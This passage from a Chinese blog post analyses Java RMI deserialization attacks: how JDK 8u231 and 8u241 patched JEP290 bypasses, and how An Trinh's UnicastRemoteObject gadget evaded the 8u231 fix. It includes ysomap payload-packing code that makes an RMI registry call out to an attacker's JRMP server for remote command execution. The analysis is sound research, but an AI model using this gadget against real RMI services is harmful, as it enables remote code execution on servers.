class="line">&#125;</span><br><span class="line"><span class="comment">//sun.rmi.transport.ConnectionInputStream#discardRefs</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">discardRefs</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.incomingRefTable.clear();<span class="comment">//消除incomingRefTable里面我们的ref</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么很清楚假如我们的payload在序列化中发生了报错，那么我们想尽办法装载的ref就会被干掉。再回头看看我们的那么多种payload都会报错么？</p><ol><li><p><strong>自定义类（动态代理或接口）</strong>：报错ClassNotFoundException</p><p>因为我们传入的类虽然会完成装载，但是在后续的序列化逻辑中肯定是会因为找不到我们的恶意类而发生ClassNotFoundException报错的。</p><p>被干掉了。</p></li><li><p><strong>动态代理转换接口或者找内置接口</strong>：报错ClassCastException</p><p>而其他的payload虽然因为都是有内置类的，这些内置类在序列化的时候<code>var9.readObject();</code>是没问题的。</p><p>但是这里还有一个类型转换的逻辑<code>var8 = (String)var9.readObject();</code>在类型转换的时候就会发生报错。</p><p>从而也被干掉了。</p></li></ol><h4 id="第二处修复"><a href="#第二处修复" class="headerlink" title="第二处修复"></a>第二处修复</h4><p>实际上第一处修复已经完美修复了，但是还有第二处修复针对的是ref被触发的时候，即<code>var7.releaseInputStream();</code></p><p>回顾<code>UnicastRef对象</code>这一小节，重新看我们POC触发的调用栈图的左下角，它必定会经过<code>sun.rmi.transport.DGCImpl_Stub#dirty</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17hh2wrsj31nf0twn3i.jpg" alt="纠错第二步.png"></p><blockquote><p>在openjdk中可以在线查看对比<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java" target="_blank" rel="noopener">8u232u8的DGCImpl_Stub.java</a>与<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java" target="_blank" rel="noopener">8u232u9的DGCImpl_Stub.java</a></p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17hpn58uj327l0v3441.jpg" alt="8u231修复第二处.png"></p><p>在dirty方法中三个关键语句：</p><ol><li><code>this.ref.newCall</code>：发起JRMP请求</li><li><code>var6.setObjectInputFilter(DGCImpl_Stub::leaseFilter);</code>：过滤</li><li><code>this.ref.invoke()</code>：触发JRMP返回payload反序列化解析</li></ol><p>把过滤器放在解析之前，那么JRMP请求是可以发起的，但是你最后命令执行的payload（比如CC）会被过滤器给干掉。</p><p>看下过滤器<code>sun.rmi.transport.DGCImpl_Stub#leaseFilter</code>：一样对长度、深度、黑名单做了限制</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17hwesedj31i10oojt1.jpg" alt="8u231的过滤器.png"></p><p>我们的payload用的是CC链，不在白名单范围内，于是GG。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var1.isPrimitive()) &#123;</span><br><span class="line">    <span class="keyword">return</span> Status.ALLOWED;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> var1 != UID.class &amp;&amp; var1 != VMID.class &amp;&amp; var1 != Lease.class &amp;&amp; (var1.getPackage() == <span class="keyword">null</span> || !Throwable.class.isAssignableFrom(var1) || !<span class="string">"java.lang"</span>.equals(var1.getPackage().getName()) &amp;&amp; !<span class="string">"java.rmi"</span>.equals(var1.getPackage().getName())) &amp;&amp; var1 != StackTraceElement.class &amp;&amp; var1 != ArrayList.class &amp;&amp; var1 != Object.class &amp;&amp; !var1.getName().equals(<span class="string">"java.util.Collections$UnmodifiableList"</span>) &amp;&amp; !var1.getName().equals(<span class="string">"java.util.Collections$UnmodifiableCollection"</span>) &amp;&amp; !var1.getName().equals(<span class="string">"java.util.Collections$UnmodifiableRandomAccessList"</span>) &amp;&amp; !var1.getName().equals(<span class="string">"java.util.Collections$EmptyList"</span>) ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="来自An-Trinh的另一种绕过JEP290的思路"><a href="#来自An-Trinh的另一种绕过JEP290的思路" class="headerlink" title="来自An Trinh的另一种绕过JEP290的思路"></a>来自An Trinh的另一种绕过JEP290的思路</h2><p>今年2月份，<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank" rel="noopener">An Trinh的RMI注册端的Bypass方法</a>一文中提出了一种新的Bypass思路，这是一条<strong>与众不同的而又”鸡肋”</strong>的Gadgets。</p><blockquote><p>上面这句话是一天前年幼无知的我写的，大胆而又无知的说”鸡肋”。一天之后回来想删掉，但是想想还是放着在下面打脸好了。</p><p>这条链比之前的都要牛逼可以继续绕过231修复，先按照这个思路看下去，提前膜拜大An Trinh佬。</p></blockquote><p>为什么要说鸡肋呢，先回顾一下我们之前是如何绕过JEP290的：</p><p><strong>攻击者发送payload让RMI注册端发起一个JRMP请求去链接我们的JRMP服务器，然后接受并反序列化我们JRMP服务器返回的报错信息，反序列化的时候通过RMI注册端内部的利用链（比如CC）完成命令执行</strong></p><p>An Trinh的绕过思路还是这个套路，JRMP的部分一模一样没有改变，与我们之前不同的是<strong>如何让RMI注册端发起JRMP请求这一部分</strong>。</p><p>之前我们提出许多许多攻击方式：绕过客户端-自实现协议去封装、动态代理、UnicastRef类型参数实现Remote接口的类等等、甚至可以自定义一个符合要求的类来攻击。</p><p>但是回归到这些攻击方式，其本质都是利用：</p><ol><li><strong>readobject反序列化的过程会递归反序列化我们的对象，一直反序列化到我们的UnicastRef类。</strong></li><li><strong>在readobejct反序列化的过程中填装UnicastRef类到<code>incomingRefTable</code></strong></li><li><strong>在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求</strong></li></ol><p>(后两步是发起JRMP请求的细节，在 UnicastRef对象 一节中有详细说到，可以粗糙的理解成readobject出发了JRMP查询也没事)</p><p>在这个本质的基础上，我们所做的、所解决的问题只是在：选择UnicastRef类包装或者不包装（包装是为了迎合JDK客户端底层的代码）、用jdk中已有的类包装还是自定义类包装，或者用动态代理包装还是原生接口包装，又再是用什么原生接口包装，有的包装不好用怎么办？巴拉巴拉的在处理这些问题。</p><hr><p>但是An Trinh提出了一个新的思路来发起JRMP请求，不是利用<strong>readobject的递归-填装-触发</strong>的模式，而是<strong>readobject函数调用过程</strong>直接触发JRMP请求。</p><p>但是为什么说他鸡肋呢？因为他的payload攻击过程中：会<strong>在readobject函数中触发他的Gadgets发起JRMP连接</strong>，但是在完成后，又会回到我们的<strong>readobject的递归-填装-触发</strong>的模式中发起第二次JRMP连接。具体流程如下：</p><ol><li><strong>readobject递归反序列化到payload对象中的UnicastRef对象，填装UnicastRef对象的ref到<code>incomingRefTable</code></strong></li><li><strong>在根据readobject的第二个最著名的特性：会调用对象自实现的readobject方法，会执行UnicastRemoteObject的readObject，他的Gadgets会在这里触发一次JRMP请求</strong></li><li><strong>在releaseInputStream语句中从<code>incomingRefTable</code>中读取ref进行开始JRMP请求</strong></li></ol><p>同时他Gadgets发起JRMP请求只会发起<strong>一次请求</strong>，而readobject的递归-填装-触发的JRMP请求，由于会检测DGC是否绑定成功会<strong>循环发起JRMP</strong>，形成天然的心跳木马。</p><p>那么这样对比看起来这个Gadgets就有一种画蛇添足的感觉，一种混KPI的鸡肋优雅感（<del>天呐一天前的我竟然得出了如此羞耻的结论，辣鸡的傲慢</del>），这就是安全研究员么，爱了爱了。</p><p>但是反正让我找我是找不出来的，我们就来膜拜看看他的链在UnicastRemoteObject的readObject中是怎么做到JRMP请求的。</p><p>先给出ysomap里的封装过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> UnicastRemoteObject <span class="title">pack</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1.UnicastRef对象 -&gt; RemoteObjectInvocationHandler</span></span><br><span class="line">    <span class="comment">//obj是UnicastRef对象，先RemoteObjectInvocationHandler封装</span></span><br><span class="line">    RemoteObjectInvocationHandler handler = <span class="keyword">new</span> RemoteObjectInvocationHandler((RemoteRef) obj);</span><br><span class="line">    <span class="comment">//2. RemoteObjectInvocationHandler -&gt; RMIServerSocketFactory接口</span></span><br><span class="line">    <span class="comment">//RemoteObjectInvocationHandler通过动态代理封装转化成RMIServerSocketFactory</span></span><br><span class="line">    RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">        RMIServerSocketFactory.class.getClassLoader(),<span class="comment">// classloader</span></span><br><span class="line">        <span class="keyword">new</span> Class[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, <span class="comment">// interfaces to implements</span></span><br><span class="line">        handler<span class="comment">// RemoteObjectInvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">    <span class="comment">//通过反射机制破除构造方法的可见性性质，创建UnicastRemoteObject实例</span></span><br><span class="line">    Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="keyword">null</span>); <span class="comment">// 获取默认的</span></span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(<span class="keyword">null</span>);</span><br><span class="line">    <span class="comment">//3. RMIServerSocketFactory -&gt; UnicastRemoteObject</span></span><br><span class="line">    <span class="comment">//把RMIServerSocketFactory塞进UnicastRemoteObject实例中</span></span><br><span class="line">    ReflectionHelper.setFieldValue(remoteObject, <span class="string">"ssf"</span>, serverSocketFactory);</span><br><span class="line">    <span class="keyword">return</span> remoteObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下漏洞触发调用栈，主要分成三个关键点：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17i6p8nkj31tt0spqih.jpg" alt="另一种绕过JEP290-1.png"></p><p>从UnicastRemoteObject的readObject入口开始<code>java.rmi.server.UnicastRemoteObject#readObject</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    reexport();<span class="comment">//这里</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>java.rmi.server.UnicastRemoteObject#reexport</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reexport</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (csf == <span class="keyword">null</span> &amp;&amp; ssf == <span class="keyword">null</span>) &#123;</span><br><span class="line">         exportObject((Remote) <span class="keyword">this</span>, port);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="comment">//payload是填充了ssf的,这里</span></span><br><span class="line">         exportObject((Remote) <span class="keyword">this</span>, port, csf, ssf);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>之后的调用链很长我们直接跳到<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>这里是第二个关键处动态代理的特性，跳转到拦截器的invoke（这里的动态代理是不仅用到了接口转换的特性，用到了拦截的特性！惊了！激动！）</p><p><code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ServerSocket <span class="title">newServerSocket</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        TCPTransport.tcpLog.log(Log.VERBOSE, <span class="string">"creating server socket on "</span> + <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object var1 = <span class="keyword">this</span>.ssf;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        var1 = chooseFactory();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//var1就是我们的payload中构建的ssf.调用他的createServerSocket</span></span><br><span class="line">    <span class="comment">//会根据动态代理进入RemoteObjectInvocationHandler#invoke</span></span><br><span class="line">    ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(<span class="keyword">this</span>.listenPort);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.listenPort == <span class="number">0</span>) &#123;</span><br><span class="line">        setDefaultPort(var2.getLocalPort(), <span class="keyword">this</span>.csf, <span class="keyword">this</span>.ssf);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>java.rmi.server.RemoteObjectInvocationHandler#invoke</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Throwable</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">//method是java.rmi.server.RMIServerSocketFactory的createServerSocket方法</span></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="comment">//这边都不满足</span></span><br><span class="line">        <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> invokeObjectMethod(proxy, method, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"finalize"</span>.equals(method.getName()) &amp;&amp; method.getParameterCount() == <span class="number">0</span> &amp;&amp;</span><br><span class="line">            !allowFinalizeInvocation) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// ignore</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//进入此处</span></span><br><span class="line">            <span class="keyword">return</span> invokeRemoteMethod(proxy, method, args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  Method method,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  Object[] args)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(proxy <span class="keyword">instanceof</span> Remote)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                    <span class="string">"proxy not Remote instance"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="comment">//我们payload把RemoteObjectInvocationHandler的ref写成了JRMP恶意服务器地址</span></span><br><span class="line">          <span class="comment">//这里开始了触发JRMP请求</span></span><br><span class="line">            <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                              getMethodHash(method));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br></pre></td></tr></table></figure><p>令人激动的<code>sun.rmi.server.UnicastRef#invoke</code>我们之前JRMP触发就是在这里触发的，但是之前是<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>虽然接口是不一样，但是做的事情差不多</p><p><code>sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Remote var1, Method var2, Object[] var3, <span class="keyword">long</span> var4)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">//省略部分代码...  </span></span><br><span class="line">    <span class="comment">//从ref中获取连接</span></span><br><span class="line">    Connection var6 = <span class="keyword">this</span>.ref.getChannel().newConnection();</span><br><span class="line">        StreamRemoteCall var7 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">boolean</span> var8 = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">boolean</span> var9 = <span class="keyword">false</span>;</span><br><span class="line">        Object var13;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                clientRefLog.log(Log.VERBOSE, <span class="string">"opnum = "</span> + var4);</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">//********对ref发起JRMP请求**********</span></span><br><span class="line">            var7 = <span class="keyword">new</span> StreamRemoteCall(var6, <span class="keyword">this</span>.ref.getObjID(), -<span class="number">1</span>, var4);</span><br><span class="line">   <span class="comment">//处理结果</span></span><br><span class="line">            Object var11;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectOutput var10 = var7.getOutputStream();</span><br><span class="line">                <span class="keyword">this</span>.marshalCustomCallData(var10);</span><br><span class="line">                var11 = var2.getParameterTypes();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> var12 = <span class="number">0</span>; var12 &lt; ((Object[])var11).length; ++var12) &#123;</span><br><span class="line">                    marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var39) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF, <span class="string">"IOException marshalling arguments: "</span>, var39);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling arguments"</span>, var39);</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">//*******JRMP服务端返回信息，反序列化触发处*******</span></span><br><span class="line">            var7.executeCall();</span><br></pre></td></tr></table></figure><p>JRMP请求已经发起了并且返回包也收到了，接下来的报错信息饭反序列化触发点就一样了</p><p><code>sun.rmi.transport.StreamRemoteCall#executeCall</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//..省略</span></span><br><span class="line">  <span class="keyword">switch</span>(var1) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Object var14;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//***这里触发反序列化JRMP服务端的返回的恶意对象***</span></span><br><span class="line">                var14 = <span class="keyword">this</span>.in.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br></pre></td></tr></table></figure><p>总结三个关键点：</p><ol><li>利用readobject的复写特性执行UnicastRemoteObject的readObject</li><li>利用动态代理的拦截执行invoke的特性，在UnicastRemoteObject#readObject的调用链中执行<code>proxy对象.createServerSocket</code>跳到了RemoteObjectInvocationHandler的invoke方法</li><li>RemoteObjectInvocationHandler的invoke方法可以根据内置的ref向外发起JRMP连接，再反序列化返回结果</li></ol><p>妙呀妙呀，动态代理终于再也不是工具人了。</p><p>妙啊妙啊，大佬就是大佬。</p><h3 id="复现—绕过8u231"><a href="#复现—绕过8u231" class="headerlink" title="复现—绕过8u231"></a>复现—绕过8u231</h3><p>利用ysomap的RMIConnectWithUnicastRemoteObject模块就可以惹。（也可以在源码的ysomap.core.exploit.rmi.NamingTest#lookup测试模块进行测试）</p><p>但是我们会发现……..刚才用之前的<strong>readobject的递归-填装-触发</strong>绕过方法在8u231还会被完美拦截，这次却可以了…..</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17ivy1q8j320m11dgxv.jpg" alt="另一种绕过JEP290-8u231成功png.png"></p><p>激动的搓手手！An Trinh NB！鸡肋个锤子鸡肋，这个绕过方式绕过了231u11版本！！！</p><p>我们来看看是如何做到的！同样从231u11的两处修复出发：</p><ol><li><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>报错情况消除ref<br>看上面的触发流程，你就知道为啥绕过了。<br>这项修复针对的是<strong>readobject的递归-填装-触发模式</strong>JRMP请求发起，在readobject中利用复写的Gadagets完全不受这个ref清除操作的影响。完美！</li><li><code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前了黑名单<br>这是针对在JRMP触发链获取到JRMP服务器之后的一个黑名单拦截修复。<br>但是看看上面利用成功调用栈，会发现这个调用栈压根不走DGC层的dirty，而是直接调用了ref的invoke，相当于绕过了之前触发链的黑名单拦截。完美！</li></ol><p>那么为什么这个Gadgets能绕过231u11的修复，我们也就清楚了。也不知道是无意为之还是刻意所为，这种每个地方都恰到好处的美感…….嘶…….</p><h3 id="8u241的修复第一处"><a href="#8u241的修复第一处" class="headerlink" title="8u241的修复第一处"></a>8u241的修复第一处</h3><p>在8u241版本，针对这个绕过链进行了修复：修复说明在<a href="https://www.oracle.com/technetwork/java/javase/8u241-relnotes-5813177.html#JDK-8230967" target="_blank" rel="noopener">Oracle官网也有说明</a></p><p>重点就是把应该是String的地方从本来的<code>(String)var9.readobject()</code>改成了<br><code>SharedSecrets.getJavaObjectInputStreamReadString().readString(var9);</code>前者是可以反序列化Object的，但是后者就完全不接受反序列化Object。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17j29sk8j317m0d6wfk.jpg" alt="另一种绕过JEP290-8U241修复.png"></p><p>为什么不接受反序列化Object呢，调试跟进看readString里面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">readString</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (String) readObject(String.class);<span class="comment">//进入此处</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException cnf) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(cnf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了<code>java.io.ObjectInputStream#readObject(java.lang.Class&lt;?&gt;)</code>，这个readString进来的接口跟我们平时调用readObject不一样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//平时调用的</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> readObject(Object.class);<span class="comment">//我们平常会进入此处</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readObject(Object.class);</code>与<code>readObject(String.class);</code></p><p>在<code>java.io.ObjectInputStream#readObject(type)</code>会进行一些无关竟要的操作然后传递type<br>进入<code>java.io.ObjectInputStream#readObject0(type)</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//8u241时这里，type传入String</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readObject0</span><span class="params">(Class&lt;?&gt; type, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">case</span> TC_OBJECT:<span class="comment">//我们输入的payload对象是一个Object</span></span><br><span class="line">        <span class="keyword">if</span> (type == String.class) &#123;</span><br><span class="line">            <span class="comment">//8u241 type=String 直接在此处报错不进行反序列化了</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException(<span class="string">"Cannot cast an object to java.lang.String"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//之前的版本都是传入type=Object于是正常反序列化</span></span><br><span class="line">        <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在8u241中，如果参数应该是String的反序列化点就直接拒绝了Object的反序列化，杜绝了我们的上面的Gadgets。</p><h3 id="bind加上IP限制枷锁还可以用？"><a href="#bind加上IP限制枷锁还可以用？" class="headerlink" title="bind加上IP限制枷锁还可以用？"></a>bind加上IP限制枷锁还可以用？</h3><p>那么是不是所有地方都做了这种限制呢？其实也不是，重新看回<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"> <span class="comment">//bind操作，权限检查</span></span><br><span class="line">    RegistryImpl.checkAccess(<span class="string">"Registry.bind"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       var10 = (ObjectInputStream)var7.getInputStream();</span><br><span class="line">       var8 = SharedSecrets.getJavaObjectInputStreamReadString().readString(var10);</span><br><span class="line">       var81 = (Remote)var10.readObject();<span 